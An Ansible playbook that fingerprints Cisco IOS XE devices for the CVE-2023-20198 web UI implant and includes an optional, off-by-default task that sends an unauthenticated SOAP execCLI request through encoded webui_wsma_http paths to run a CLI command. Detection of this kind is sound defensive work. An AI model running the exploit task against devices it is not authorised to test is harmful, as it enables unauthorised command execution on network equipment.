---
- name: CVE-2023-20198 Cisco IOS XE Web UI Privilege Escalation Vulnerability and Implant Fingerprinting Playbook
  gather_facts: false
  hosts: all
  vars:
    uri:
      - "webui/logoutconfirm.html?menu=1"
      - "webui/logoutconfirm.html?logon_hash=1"
    exp: false
    expuri:
      - "%2577ebui_wsma_http"
      - "%2577eb%2575i_%2577sma_http"
    expcmd: "show ver"
    ports:
      - 80
      - 443
    headers:
      authorization:
        - "0ff4fbf0ecffa77ce8d3852a29263e263838e9bb"
    pattern1: '^([a-f0-9]{18})\s*$'
    pattern2: '404\sNot\sFound'
    patternexp: 'Cisco\sIOS\sXE\sSoftware,\sVersion'
  tasks:
    - name: Attempt exploit against device
      ansible.builtin.uri:
        url: "http{{ (item.1 | int == 443) | ternary('s', '') }}://{{ inventory_hostname }}/{{ item.0 }}"
        method: POST
        timeout: 2
        status_code: 200
        return_content: true
        force: true
        validate_certs: false
        body_format: raw
        body: |
          <?xml version="1.0"?>
          <SOAP:Envelope
            xmlns:SOAP="http://schemas.xmlsoap.org/soap/envelope/"
            xmlns:SOAP-ENC="http:// schemas.xmlsoap.org/soap/encoding/"
            xmlns:xsd="http://www.w3.org/2001/XMLSchema"
            xmlns:xsi="http://www.w3.org/2001/XMLSchema- instance">
              <SOAP:Header>
                <wsse: Security xmlns:wsse="
                  http://schemas.xmlsoap.org/ws/2002/04/secext">
                  <wsse:UsernameToken SOAP:mustUnderstand="false">
                    <wsse:Username>
                    </wsse:Username>
                    <wsse:Password>
                      *****
                    </wsse:Password>
                  </wsse: UsernameToken>
                </wsse:Security>
              </SOAP:Header>
            <SOAP:Body>
              <request correlator="exec1" xmlns="urn:cisco:wsma-exec">
                <execCLI xsd="false">
                  <cmd>
                    {{ expcmd }}
                  </cmd>
                  <dialogue>
                    <expect>
                    </expect>
                    <reply>
                    </reply>
                  </dialogue>
                </execCLI>
              </request>
            </SOAP:Body>
          </SOAP:Envelope>
      loop: "{{ expuri | product(ports) }}"
      register: response_exp
      ignore_errors: true
      delegate_to: 127.0.0.1
      tags:
        - exploit
      when: exp | bool

    - name: Examine device response for exploit
      ansible.builtin.debug:
        msg: "Device {{ inventory_hostname }} found listening on uri / port {{ item.item }} with suspicious response: {{ item.content }}"
      loop: "{{ response_exp.results }}"
      when:
        - exp | bool
        - response_exp
        - item.status == 200
        - item.content | regex_search(patternexp, multiline=True)
      tags:
        - exploit

    - name: Fingerprint device for firngerprint 1
      ansible.builtin.uri:
        url: "http{{ (item.1 | int == 443) | ternary('s', '') }}://{{ inventory_hostname }}/{{ item.0 }}"
        method: POST
        timeout: 2
        status_code: 200
        return_content: true
        force: true
        validate_certs: false
      loop: "{{ uri | product(ports) }}"
      register: response_fp1
      ignore_errors: true
      delegate_to: 127.0.0.1
      tags:
        - fingerprint1

    - name: Examine device response for fingerprint 1
      ansible.builtin.debug:
        msg: "Device {{ inventory_hostname }} found listening on uri / port {{ item.item }} with suspicious response: {{ item.content }}"
      loop: "{{ response_fp1.results }}"
      when:
        - response_fp1 is defined
        - item.status == 200
        - item.content | trim | list | length == 18
        - item.content | regex_search(pattern1, multiline=True)
      tags:
        - fingerprint1

    - name: Fingerprint device for firngerprint 2
      ansible.builtin.uri:
        url: "http{{ (item.0.1 | int == 443) | ternary('s', '') }}://{{ inventory_hostname }}/{{ item.0.0 }}"
        method: POST
        timeout: 2
        status_code: 200
        return_content: true
        force: true
        validate_certs: false
        headers:
          Authorization: "{{ item.1 }}"
      loop: "{{ uri | product(ports) | list | product(headers.authorization) }}"
      register: response_fp2
      ignore_errors: true
      delegate_to: 127.0.0.1
      tags:
        - fingerpint2

    - name: Examine device response for fingerprint 2
      ansible.builtin.debug:
        msg: "Device {{ inventory_hostname }} found listening on uri / port {{ item.item }} with suspicious response: {{ item.content }}"
      loop: "{{ response_fp2.results }}"
      when:
        - response_fp2 is defined
        - item.status == 200
        - item.content | trim | list | length == 18
        - item.content | regex_search(pattern1, multiline=True)
      tags:
        - fingerprint2

    - name: Fingerprint device for firngerprint 3
      ansible.builtin.uri:
        url: "http{{ (item | int == 443) | ternary('s', '') }}://{{ inventory_hostname }}/%25"
        method: GET
        timeout: 2
        status_code: 200
        return_content: true
        force: true
        validate_certs: false
      loop: "{{ ports }}"
      register: response_fp3
      ignore_errors: true
      delegate_to: 127.0.0.1
      tags:
        - fingerprint3

    - name: Examine device response for fingerprint 3
      ansible.builtin.debug:
        msg: "Device {{ inventory_hostname }} found listening on uri / port {{ item.item }} with suspicious response: {{ item.content }}"
      loop: "{{ response_fp3.results }}"
      when:
        - response_fp3 is defined
        - item.status == 200
        - item.content | regex_search(pattern2, multiline=True)
      tags:
        - fingerprint3
